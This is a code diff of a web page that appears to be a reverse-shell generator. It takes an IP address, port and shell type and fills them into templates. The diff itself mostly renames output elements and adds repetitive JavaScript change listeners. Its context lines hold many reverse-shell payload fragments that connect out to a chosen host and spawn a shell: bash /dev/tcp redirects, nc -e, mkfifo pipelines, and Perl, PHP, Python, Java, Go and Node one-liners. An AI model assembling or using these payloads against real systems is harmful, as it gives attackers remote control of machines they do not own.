@@ -1,4 +1,3 @@
-
 <!-- Include Head -->
 <?php include "assest/head.php"; ?>
 <?php include "assest/header.php" ?>
@@ -264,7 +263,7 @@ background-color: #666;
        var port=document.createElement("port");
       </script>
       
-     
+     <br>
 <p>IP address:</p>
  <input id="numbie2" id="ip" onchange="myFunction()">
  <p>
@@ -272,10 +271,13 @@ background-color: #666;
   <h1>    </h1>
   
 
-
+ 
 <p>Port:</p>
  <input id="numb" id="port" onchange="secFunction()">
     
+    
+    <br>
+    <br>
   </ul>
   
   
@@ -296,9 +298,9 @@ background-color: #666;
 <div class="w3-bar w3-theme">
 
  
-   <button class="w3-bar-item w3-button w3-border testbuttn w3-medium" onclick="listener(event,'other types')">Others</button>
-  <button class="w3-border w3-button w3-medium testbuttn" onclick="listener(event,'socat')">socat</button>
-  <button class="w3-bar-item w3-button w3-border testbuttn w3-medium" onclick="listener(event,'MSF')">msfconsole</button>
+   <button class="w3-bar-item w3-button testbuttn w3-medium" onclick="listener(event,'other types')">Others</button>
+  <button class="w3-button w3-medium testbuttn" onclick="listener(event,'socat')">socat</button>
+  <button class="w3-bar-item w3-button testbuttn w3-medium" onclick="listener(event,'MSF')">msfconsole</button>
 
  </div>
   
@@ -338,6 +340,7 @@ background-color: #666;
  
  <div id="other types" class="w3-container city1 w3-animate-opacity">
  <br>
+ 
     <label for="type">Type:</label>
 
 <select class="type" name="type">
@@ -393,8 +396,9 @@ result.textContent = `  ${event.target.value}`;
  </div>
 </div>
 </div>
+ <br>
 </div>
- 
+
 </div>
 </div>
    
@@ -419,7 +423,7 @@ result.textContent = `  ${event.target.value}`;
 
   <div class="w3-dropdown-hover">
 
-    <button class="w3-button w3-theme w3-large" name="OS"> OS: <i class="fa fa-caret-down"></i></button>
+    <button class="w3-button w3-theme w3-large" id="OS" name="OS"> OS: <i class="fa fa-caret-down"></i></button>
     <div class="w3-dropdown-content w3-bar-block w3-border">
     
     <!-- Control buttons -->
@@ -438,28 +442,28 @@ result.textContent = `  ${event.target.value}`;
    
      <script>
      
-     const selectElement = document.querySelector('.OS');
+     const selecterElement = document.querySelector('.OS');
 
-selectElement.addEventListener('change', (event) => {
+selecterElement.addEventListener('change', (event) => {
   const ans = document.querySelector('.ans');
   ans.textContent = ` ${event.target.value}`;
 });
 
 
 </script>
+
      
      
     <div class="w3-container w3-right-align">
-  <h3 class="w3-text-theme w3-large ">    
+  <h3 class="w3-text-theme w3-large">    
   
-    <label for="shell">shell:</label>
+    <label>shell: 
 
 <select class="shell" name="shell">
 
 <option value="choose one"> </option>
   <option value="sh">sh</option>
   <option value="/bin/sh">/bin/sh</option>
-  <option value="ncattls">ncat (TLS)</option>
   <option value="bash"> bash</option>
  <option value="/bin/bash">/bin/bash</option>
   <option value="cmd">cmd</option>
@@ -470,9 +474,13 @@ selectElement.addEventListener('change', (event) => {
        <option value="csh ">csh</option>
         <option value="ksh">ksh</option>
         <option value="zsh">zsh</option>
-       <option value="pdksh ">pdksh</option>
+       <option value="pdksh">pdksh</option>
         <option value="tcsh">tcsh</option>
 </select>
+</label>
+
+
+
 <br>
 <br>
 <label for="encoding">encoding:</label>
@@ -578,7 +586,8 @@ selectElement.addEventListener('change', (event) => {
 
   
  
-     
+ 
+ 
 
 <div id="bashi" class="tabcontent">
  <div class="float-right-child w3-container w3-border">
@@ -587,9 +596,9 @@ selectElement.addEventListener('change', (event) => {
 
   
     <p>Command:</p>
-    <div class="shellanswer"> </div>
+   
     <div id="mydiv">
-         
+           <div class="shellans"> </div>
     <p> &nbsp -i >& /dev/tcp/ </p>
     <p id="ip eighteen"></p>
 
@@ -603,20 +612,6 @@ selectElement.addEventListener('change', (event) => {
     </div>
 
 
-<script>
-
-  const selectElement = document.querySelector('.shell');
-
-selectElement.addEventListener('change', (event) => {
-  const shellanswer = document.querySelector('.shellanswer');
- 
- 
-shellanswer.textContent = `  ${event.target.value}`;
-
-});
- 
-
-</script>
 </div>
 </div>
 
@@ -634,7 +629,7 @@ shellanswer.textContent = `  ${event.target.value}`;
     <p>/</p>
     <p id="port nineteen"></p>
     <p>;</p>
-     <div class="shellans"> </div>
+     <div class="one"> </div>
     
     <p>&nbsp &lt&196 >&196 2>&196</p>
 
@@ -675,8 +670,8 @@ shellanswer.textContent = `  ${event.target.value}`;
    
   <p>Command:</p>
    <div id="mydiv">
-       <div class="shellans"> </div>
-    <p> -i 5<> /dev/tcp/</p>
+       <div class="two"> </div>
+    <p> &nbsp -i 5<> /dev/tcp/</p>
     <p id="ip twenty one"></p>
     <p>/</p>
     <p id="port twenty one"></p>
@@ -695,7 +690,7 @@ shellanswer.textContent = `  ${event.target.value}`;
    
   <p>Command:</p>
      <div id="mydiv">
-     <div id="shellans"> </div>
+     <div class="three"> </div>
     <p> &nbsp -i >& /dev/udp/ </p>
     <p id="ip twenty two"></p>
     <p>/</p>
@@ -721,7 +716,7 @@ shellanswer.textContent = `  ${event.target.value}`;
   <p>Command:</p>
     <div id="mydiv">
     <p>  nc -e &nbsp  </p>
-    <div class="shellans"> </div>
+    <div class="four"> </div>
     <p> &nbsp </p>
         <p id="ip twenty three"></p>
     <p> &nbsp </p>
@@ -738,7 +733,7 @@ shellanswer.textContent = `  ${event.target.value}`;
   <p>Command:</p>
       <div id="mydiv">
     <p>  nc.exe -e &nbsp   </p>
-    <div class="shellans"> </div>
+    <div class="five"> </div>
        <p> &nbsp </p>
         <p id="ip twenty four"></p>
     <p> &nbsp </p>
@@ -757,7 +752,7 @@ shellanswer.textContent = `  ${event.target.value}`;
   <p>Command:</p>
       <div id="mydiv">
     <p> nc -c &nbsp</p>
-    <div class="shellans"> </div>
+    <div class="six"> </div>
         <p> &nbsp </p>
         <p id="ip twenty five"></p>
     <p> &nbsp </p>
@@ -778,7 +773,7 @@ shellanswer.textContent = `  ${event.target.value}`;
     <p> rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|</p>
     
     
-     <div class="shellans"> </div>
+     <div class="seven"> </div>
      
      
      <p>&nbsp -i 2>&1|ncat -u &nbsp </p>
@@ -805,7 +800,7 @@ shellanswer.textContent = `  ${event.target.value}`;
     <p> &nbsp </p>
         <p id="port twenty seven"></p>
         <p>&nbsp  -e bash &nbsp </p>
-    <div class="shellans"> </div>
+    <div class="eight"> </div>
      
 </div>
 </div>
@@ -820,7 +815,7 @@ shellanswer.textContent = `  ${event.target.value}`;
     <div id="mydiv">
     <p> rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|</p>
     
-    <div class="shellans"> </div>
+    <div class="nine"> </div>
     
    <p> &nbsp -i 2>&1|nc &nbsp </p>
     <p id="ip twenty eight"></p>
@@ -847,7 +842,7 @@ shellanswer.textContent = `  ${event.target.value}`;
     <p> &nbsp </p>
         <p id="port twenty nine"></p>
        <p> &nbsp -e &nbsp </p>
-    <div class="shellans"> </div>
+    <div class="ten"> </div>
      
 </div>
 </div>
@@ -897,7 +892,7 @@ int main(void){
 
  <div id="mydiv">
      <p> char * const argv[] = {"</p>
-     <div class="shellans"> </div>
+     <div class="eleven"> </div>
      <p>", NULL};</p>
      </div>
      
@@ -1091,7 +1086,7 @@ int main(void){
 
  <div id="mydiv">
     <p> main = callCommand "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f |&nbsp</p>
-   <div class="shellans"> </div>
+   <div class="twelve"> </div>
     <p>&nbsp -i 2>&1 | nc&nbsp</p>
          <p id="ip thirty three"></p>
    <p> &nbsp </p>
@@ -1124,7 +1119,7 @@ int main(void){
    <p id="port thirty four"></p>
    <p>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec(&quot</p>
  
-    <div class="shellans"> </div>
+    <div class="thirteen"> </div>
     <p>&nbsp -i");};' </p>
     </div>
       
@@ -1173,7 +1168,7 @@ int main(void){
          <p> &nbsp </p>
          <p>-r</p>
          <p> &nbsp </p>
-            <div class="shellans"> </div>
+            <div class="fourteen"> </div>
         
     </div>
     
@@ -1210,7 +1205,7 @@ int main(void){
        <p id="port thirty seven"></p>
      <p>;$ð = "</p>
      
-    <div class="shellans"> </div>
+    <div class="fifteen"> </div>
      
      <p>". $ð¤</p>
      </div>
@@ -1258,7 +1253,7 @@ $port =
 <p>$write_a = null;</p>
 <p>$error_a = null;</p>
 <p>$shell = 'uname -a; w; id;&nbsp</p>
- <div class="shellans"> </div>
+ <div class="sixteen"> </div>
 
 <p>&nbsp -i';</p>
 <p>$daemon = 0;</p>
@@ -1368,7 +1363,7 @@ $port =
 
     
     </p>
-    <div class="shellans"> </div>
+    
      
 </div>
 </div>
@@ -1414,7 +1409,7 @@ $port =
      <div id="mydiv">
     
      <p>       $this->shell = '</p>
-       <div class="shellans"> </div>
+       <div class="seventeen"> </div>
     <p> ';  </p>
      
      
@@ -1656,7 +1651,7 @@ $port =
 <p id="port fourty"></p>
    <p>);exec("</p>
    
-    <div class="shellans"> </div>
+    <div class="eighteen"> </div>
     
    <p>&nbsp &lt&3 >&amp3 2>&amp3");'</p>
     </p>
@@ -1685,7 +1680,7 @@ $port =
 <p id="port fourty one"></p>
    <p>);shell_exec("</p>
    
-    <div class="shellans"> </div>
+    <div class="nineteen"> </div>
     
    <p>&nbsp &lt&3 >&amp3 2>&amp3");'</p>
     </p>
@@ -1715,7 +1710,7 @@ $port =
 <p id="port fourty two"></p>
    <p>);system("</p>
    
-    <div class="shellans"> </div>
+    <div class="twenty"> </div>
     
    <p>&nbsp &lt&3 >&amp3 2>&amp3");'</p>
     </p>
@@ -1745,7 +1740,7 @@ $port =
 <p id="port fourty three"></p>
    <p>);passthru("</p>
    
-    <div class="shellans"> </div>
+    <div class="twentyone"> </div>
     
    <p>&nbsp &lt&3 >&amp3 2>&amp3");'</p>
     </p>
@@ -1772,7 +1767,7 @@ $port =
     <p>",&nbsp</p>
     <p id="port fourty four"></p>
     <p>);`&nbsp</p>
-    <div class="shellans"> </div>
+    <div class="twentytwo"> </div>
     <p> &nbsp&lt&3 >&3 2>&3`;'
     </p>
  
@@ -1798,7 +1793,7 @@ $port =
    <p> );popen("</p>
     
     
-    <div class="shellans"> </div>
+    <div class="twentythree"> </div>
     <p> &nbsp&lt&3 >&3 2>&3", "r");'</p>
     
     </p>
@@ -1824,7 +1819,7 @@ $port =
     <p id="port fourty six"></p>
     
    <p> );$proc=proc_open("</p>
-    <div class="shellans"> </div>
+    <div class="twentyfour"> </div>
    
    <p>", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
     
@@ -2087,7 +2082,7 @@ $port =
        <p id="port fifty four"></p>
    <p> ;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("</p>
     
-     <div class="shellans"> </div>
+     <div class="twentyfive"> </div>
     
   <p>  ")'
     
@@ -2113,7 +2108,7 @@ $port =
     
   <p>  ));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("</p>
   
-   <div class="shellans"> </div>
+   <div class="twentysix"> </div>
  <p>  ")'</p>
   
     
@@ -2140,7 +2135,7 @@ $port =
     <p id="port fifty five"></p>
     <p>;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("</p>
     
-      <div class="shellans"> </div>
+      <div class="twentyseven"> </div>
    <p> ")'</p>
     
     
@@ -2167,7 +2162,7 @@ $port =
     <p id="port fifty seven"></p>
     
    <p> ));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("</p>
-     <div class="shellans"> </div>
+     <div class="twentyeight"> </div>
  <p>  ")'</p>
     
     
@@ -2196,7 +2191,7 @@ $port =
     
    <p> ));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("</p>
     
-    <div class="shellans"> </div>
+    <div class="twentynine"> </div>
     
     
    <p> ")'
@@ -2228,7 +2223,7 @@ $port =
     
     </p>&nbsp</p>
     
-    <div class="shellans"> </div>
+    <div class="thirty"> </div>
     
     <p>&nbsp1>$TF</p>
      
@@ -2313,7 +2308,7 @@ $port =
      <div id="mydiv">
      <p>   Process.start('
      
-     <div class="shellans"> </div>
+     <div class="thirtyone"> </div>
      
      ', []).then((Process process) { </p>
      
@@ -2356,7 +2351,7 @@ $port =
      <p id="port sixty three"></p>
       <p> &nbsp</p>
     EXEC: </p>
-    <div class="shellans"> </div>
+    <div class="thirtytwo"> </div>
  </div>    
 </div>
 </div>
@@ -2373,7 +2368,7 @@ $port =
     <p>:</p>
      <p id="port sixty four"></p>
    <p> EXEC:'</p>
-     <div class="shellans"> </div>
+     <div class="thirtythree"> </div>
    <p> ',pty,stderr,setsid,sigint,sane</p>
   
  </div>    
@@ -2389,7 +2384,7 @@ $port =
   <div id="mydiv">
     <p> require('child_process').exec('nc -e&nbsp</p>
     
-   <div class="shellans"> </div>
+   <div class="thirtyfour"> </div>
    <p> &nbsp</p>
   <p id="ip sixty five"></p>
     <p> &nbsp</p>
@@ -2415,7 +2410,7 @@ $port =
         
          <p> <div id="mydiv">
         <p>  sh = cp.spawn(" </p>
-        <div class="shellans"> </div>
+        <div class="thirtyfive"> </div>
         <p>  ", []); </p>
         </div>
         </p>
@@ -2458,7 +2453,7 @@ $port =
     <p id="port sixty seven"></p>
     <p>;String cmd="</p>
     
-     <div class="shellans"> </div>
+     <div class="thirtysix"> </div>
     <p>";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();</p>
     
      
@@ -2568,7 +2563,7 @@ $port =
     </div>
      <div id="mydiv">
      <p>     String cmd = "
-       <div class="shellans"> </div>
+       <div class="thirtyseven"> </div>
      </p>
     <p> ";</p>
     </div>
@@ -2632,7 +2627,7 @@ $port =
                         <div id="mydiv">
                       <p> "var cmd = '
                       
-                        <div class="shellans"> </div>
+                        <div class="thirtyeight"> </div>
                       ';"+</p>
                       </div>
                       </p>
@@ -2685,7 +2680,7 @@ ref.add(new StringRefAddr("x", x);</p>
     
     <p>');os.execute('</p>
      <p> &nbsp</p>
-    <div class="shellans"> </div>
+    <div class="thirtynine"> </div>
      <p> &nbsp</p>
    <p> -i &lt&3 >&3 2>&3');"
     </p>
@@ -2727,7 +2722,7 @@ ref.add(new StringRefAddr("x", x);</p>
     <p id="port seventy four"></p>
    <p> ");cmd:=exec.Command("</p>
     
-    <div class="shellans"> </div>
+    <div class="fourty"> </div>
     
     <p>");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go </p>
     
@@ -2742,7 +2737,7 @@ ref.add(new StringRefAddr("x", x);</p>
   <p>Command:</p>
   <div id="mydiv">
     <p> echo 'import os' > /tmp/t.v && echo 'fn main() { os.system("nc -e &nbsp</p>
-     <div class="shellans"> </div>
+     <div class="fourtyone"> </div>
   <p>  &nbsp</p>
   <p id="ip seventy five"></p>
      <p> &nbsp</p>
@@ -3158,6 +3153,412 @@ stdin=sp.PIPE);c.sendall
 
 <!-- Script for Sidebar, Tabs, Accordions, Progress bars and slideshows -->
 <script>
+const selectedElement = document.querySelector('.shell');
+
+selectedElement.addEventListener('change', (event) => {
+  const shellans = document.querySelector('.shellans');
+  shellans.textContent = `  ${event.target.value}`;
+});
+
+</script>
+
+<script>
+const selecteddElement = document.querySelector('.shell');
+
+selecteddElement.addEventListener('change', (event) => {
+  const one = document.querySelector('.one');
+  one.textContent = `  ${event.target.value}`;
+});
+
+</script>
+
+ 
+ <script>
+const two = document.querySelector('.shell');
+
+two.addEventListener('change', (event) => {
+  const two = document.querySelector('.two');
+  two.textContent = `  ${event.target.value}`;
+});
+
+</script>
+     
+      <script>
+const three = document.querySelector('.shell');
+
+three.addEventListener('change', (event) => {
+  const three = document.querySelector('.three');
+  three.textContent = `  ${event.target.value}`;
+});
+
+</script>
+ <script>
+const four = document.querySelector('.shell');
+
+four.addEventListener('change', (event) => {
+  const four = document.querySelector('.four');
+  four.textContent = `  ${event.target.value}`;
+});
+
+</script>
+ <script>
+const five = document.querySelector('.shell');
+
+five.addEventListener('change', (event) => {
+  const five = document.querySelector('.five');
+  five.textContent = `  ${event.target.value}`;
+});
+
+</script>
+
+
+ <script>
+const six = document.querySelector('.shell');
+
+six.addEventListener('change', (event) => {
+  const six = document.querySelector('.six');
+  six.textContent = `  ${event.target.value}`;
+});
+
+</script>
+<script>
+const seven = document.querySelector('.shell');
+
+seven.addEventListener('change', (event) => {
+  const seven = document.querySelector('.seven');
+  seven.textContent = `  ${event.target.value}`;
+});
+
+</script>
+
+ <script>
+const eight = document.querySelector('.shell');
+
+eight.addEventListener('change', (event) => {
+  const eight = document.querySelector('.eight');
+  eight.textContent = `  ${event.target.value}`;
+});
+
+</script>
+<script>
+const nine = document.querySelector('.shell');
+
+nine.addEventListener('change', (event) => {
+  const nine = document.querySelector('.nine');
+  nine.textContent = `  ${event.target.value}`;
+});
+
+</script>
+ 
+ <script>
+const ten = document.querySelector('.shell');
+
+ten.addEventListener('change', (event) => {
+  const ten = document.querySelector('.ten');
+  ten.textContent = `  ${event.target.value}`;
+});
+
+</script>
+
+<script>
+const eleven = document.querySelector('.shell');
+
+eleven.addEventListener('change', (event) => {
+  const eleven = document.querySelector('.eleven');
+  eleven.textContent = `  ${event.target.value}`;
+});
+
+</script>
+<script>
+const twelve = document.querySelector('.shell');
+
+twelve.addEventListener('change', (event) => {
+  const twelve = document.querySelector('.twelve');
+  twelve.textContent = `  ${event.target.value}`;
+});
+
+</script>
+ <script>
+const thirteen = document.querySelector('.shell');
+
+thirteen.addEventListener('change', (event) => {
+  const thirteen = document.querySelector('.thirteen');
+  thirteen.textContent = `  ${event.target.value}`;
+});
+
+</script>
+ <script>
+const fourteen = document.querySelector('.shell');
+
+fourteen.addEventListener('change', (event) => {
+  const fourteen = document.querySelector('.fourteen');
+  fourteen.textContent = `  ${event.target.value}`;
+});
+
+</script>
+ <script>
+const fifteen = document.querySelector('.shell');
+
+fifteen.addEventListener('change', (event) => {
+  const fifteen = document.querySelector('.fifteen');
+  fifteen.textContent = `  ${event.target.value}`;
+});
+
+</script>
+ <script>
+const sixteen = document.querySelector('.shell');
+
+sixteen.addEventListener('change', (event) => {
+  const sixteen = document.querySelector('.sixteen');
+  sixteen.textContent = `  ${event.target.value}`;
+});
+
+</script>
+ <script>
+const seventeen = document.querySelector('.shell');
+
+seventeen.addEventListener('change', (event) => {
+  const seventeen = document.querySelector('.seventeen');
+  seventeen.textContent = `  ${event.target.value}`;
+});
+
+</script>
+ <script>
+const eighteen = document.querySelector('.shell');
+
+eighteen.addEventListener('change', (event) => {
+  const eighteen = document.querySelector('.eighteen');
+  eighteen.textContent = `  ${event.target.value}`;
+});
+
+</script>
+
+<script>
+const nineteen = document.querySelector('.shell');
+
+nineteen.addEventListener('change', (event) => {
+  const nineteen = document.querySelector('.nineteen');
+  nineteen.textContent = `  ${event.target.value}`;
+});
+
+</script>
+ <script>
+const twenty = document.querySelector('.shell');
+
+twenty.addEventListener('change', (event) => {
+  const twenty = document.querySelector('.twenty');
+  twenty.textContent = `  ${event.target.value}`;
+});
+
+</script>
+ <script>
+const twentyone = document.querySelector('.shell');
+
+twentyone.addEventListener('change', (event) => {
+  const twentyone = document.querySelector('.twentyone');
+  twentyone.textContent = `  ${event.target.value}`;
+});
+
+</script>
+ 
+ <script>
+const twentytwo = document.querySelector('.shell');
+
+twentytwo.addEventListener('change', (event) => {
+  const twentytwo = document.querySelector('.twentytwo');
+  twentytwo.textContent = `  ${event.target.value}`;
+});
+
+</script>
+
+ <script>
+const twentythree = document.querySelector('.shell');
+
+twentythree.addEventListener('change', (event) => {
+  const twentythree = document.querySelector('.twentythree');
+  twentythree.textContent = `  ${event.target.value}`;
+});
+
+</script>
+<script>
+const twentyfour = document.querySelector('.shell');
+
+twentyfour.addEventListener('change', (event) => {
+  const twentyfour = document.querySelector('.twentyfour');
+  twentyfour.textContent = `  ${event.target.value}`;
+});
+
+</script>
+
+ <script>
+const twentyfive = document.querySelector('.shell');
+
+twentyfive.addEventListener('change', (event) => {
+  const twentyfive = document.querySelector('.twentyfive');
+  twentyfive.textContent = `  ${event.target.value}`;
+});
+
+</script>
+
+ <script>
+const twentysix = document.querySelector('.shell');
+
+twentysix.addEventListener('change', (event) => {
+  const twentysix = document.querySelector('.twentysix');
+  twentysix.textContent = `  ${event.target.value}`;
+});
+
+</script>
+ <script>
+const twentyseven = document.querySelector('.shell');
+
+twentyseven.addEventListener('change', (event) => {
+  const twentyseven = document.querySelector('.twentyseven');
+  twentyseven.textContent = `  ${event.target.value}`;
+});
+
+</script>
+ <script>
+const twentyeight = document.querySelector('.shell');
+
+twentyeight.addEventListener('change', (event) => {
+  const twentyeight = document.querySelector('.twentyeight');
+  twentyeight.textContent = `  ${event.target.value}`;
+});
+
+</script>
+ 
+ <script>
+const twentynine = document.querySelector('.shell');
+
+twentynine.addEventListener('change', (event) => {
+  const twentynine = document.querySelector('.twentynine');
+  twentynine.textContent = `  ${event.target.value}`;
+});
+
+
+</script>
+
+ <script>
+const thirty = document.querySelector('.shell');
+
+thirty.addEventListener('change', (event) => {
+  const thirty = document.querySelector('.thirty');
+  thirty.textContent = `  ${event.target.value}`;
+});
+
+</script>
+
+ <script>
+const thirtyone = document.querySelector('.shell');
+
+thirtyone.addEventListener('change', (event) => {
+  const thirtyone = document.querySelector('.thirtyone');
+  thirtyone.textContent = `  ${event.target.value}`;
+});
+
+</script>
+ 
+ <script>
+const thirtytwo = document.querySelector('.shell');
+
+thirtytwo.addEventListener('change', (event) => {
+  const thirtytwo = document.querySelector('.thirtytwo');
+  thirtytwo.textContent = `  ${event.target.value}`;
+});
+
+</script>
+
+ <script>
+const thirtythree = document.querySelector('.shell');
+
+thirtythree.addEventListener('change', (event) => {
+  const thirtythree = document.querySelector('.thirtythree');
+  thirtythree.textContent = `  ${event.target.value}`;
+});
+
+</script>
+<script>
+const thirtyfour = document.querySelector('.shell');
+
+thirtyfour.addEventListener('change', (event) => {
+  const thirtyfour = document.querySelector('.thirtyfour');
+  thirtyfour.textContent = `  ${event.target.value}`;
+});
+
+</script>
+
+ <script>
+const thirtyfive = document.querySelector('.shell');
+
+thirtyfive.addEventListener('change', (event) => {
+  const thirtyfive = document.querySelector('.thirtyfive');
+  thirtyfive.textContent = `  ${event.target.value}`;
+});
+
+</script>
+
+ <script>
+const thirtysix = document.querySelector('.shell');
+
+thirtysix.addEventListener('change', (event) => {
+  const thirtysix = document.querySelector('.thirtysix');
+  thirtysix.textContent = `  ${event.target.value}`;
+});
+
+</script>
+ <script>
+const thirtyseven = document.querySelector('.shell');
+
+thirtyseven.addEventListener('change', (event) => {
+  const thirtyseven = document.querySelector('.thirtyseven');
+  thirtyseven.textContent = `  ${event.target.value}`;
+});
+
+</script>
+ <script>
+const thirtyeight = document.querySelector('.shell');
+
+thirtyeight.addEventListener('change', (event) => {
+  const thirtyeight = document.querySelector('.thirtyeight');
+  thirtyeight.textContent = `  ${event.target.value}`;
+});
+
+</script>
+ 
+ <script>
+const thirtynine = document.querySelector('.shell');
+
+thirtynine.addEventListener('change', (event) => {
+  const thirtynine = document.querySelector('.thirtynine');
+  thirtynine.textContent = `  ${event.target.value}`;
+});
+
+
+</script>
+
+ 
+ <script>
+const fourtyone = document.querySelector('.shell');
+
+fourtyone.addEventListener('change', (event) => {
+  const fourtyone = document.querySelector('.fourtyone');
+  fourtyone.textContent = `  ${event.target.value}`;
+});
+
+
+</script>
+<script>
+const fourty = document.querySelector('.shell');
+
+fourty.addEventListener('change', (event) => {
+  const fourty = document.querySelector('.fourty');
+  fourty.textContent = `  ${event.target.value}`;
+});
+
+
+</script>
+     <script>
 // Side navigation
 function w3_open() {
   var x = document.getElementById("mySidebar");
@@ -3402,7 +3803,24 @@ function secFunction() {
  document.getElementById("input port").innerHTML = text;
   document.getElementById("port again").innerHTML = text;
   document.getElementById("port once again").innerHTML = text;
-    document.getElementById("port one").innerHTML = text;  document.getElementById("port two").innerHTML = text;  document.getElementById("port three").innerHTML = text;  document.getElementById("port four").innerHTML = text;  document.getElementById("port five").innerHTML = text;  document.getElementById("port six").innerHTML = text;  document.getElementById("port seven").innerHTML = text;  document.getElementById("port eight").innerHTML = text;  document.getElementById("port nine").innerHTML = text;  document.getElementById("port ten").innerHTML = text;  document.getElementById("port eleven").innerHTML = text;  document.getElementById("port twelve").innerHTML = text;  document.getElementById("port thirteen").innerHTML = text;  document.getElementById("port fourteen").innerHTML = text;  document.getElementById("port fifteen").innerHTML = text;  document.getElementById("port sixteen").innerHTML = text;  document.getElementById("port seventeen").innerHTML = text;  document.getElementById("port eighteen").innerHTML = text;      
+    document.getElementById("port one").innerHTML = text; 
+    document.getElementById("port two").innerHTML = text; 
+    document.getElementById("port three").innerHTML = text; 
+    document.getElementById("port four").innerHTML = text; 
+    document.getElementById("port five").innerHTML = text; 
+    document.getElementById("port six").innerHTML = text; 
+    document.getElementById("port seven").innerHTML = text;
+    document.getElementById("port eight").innerHTML = text;
+    document.getElementById("port nine").innerHTML = text; 
+    document.getElementById("port ten").innerHTML = text;  
+    document.getElementById("port eleven").innerHTML = text; 
+    document.getElementById("port twelve").innerHTML = text; 
+    document.getElementById("port thirteen").innerHTML = text; 
+    document.getElementById("port fourteen").innerHTML = text; 
+    document.getElementById("port fifteen").innerHTML = text; 
+    document.getElementById("port sixteen").innerHTML = text; 
+    document.getElementById("port seventeen").innerHTML = text;  
+    document.getElementById("port eighteen").innerHTML = text;      
        document.getElementById("port nineteen").innerHTML = text;
                    
                       document.getElementById("port twenty").innerHTML = text;
@@ -3468,8 +3886,9 @@ function secFunction() {
            document.getElementById("port seventy five").innerHTML = text;
                     
 }
-  </script> 
- 
+
+
+</script> 
 </script>
 
 </body>
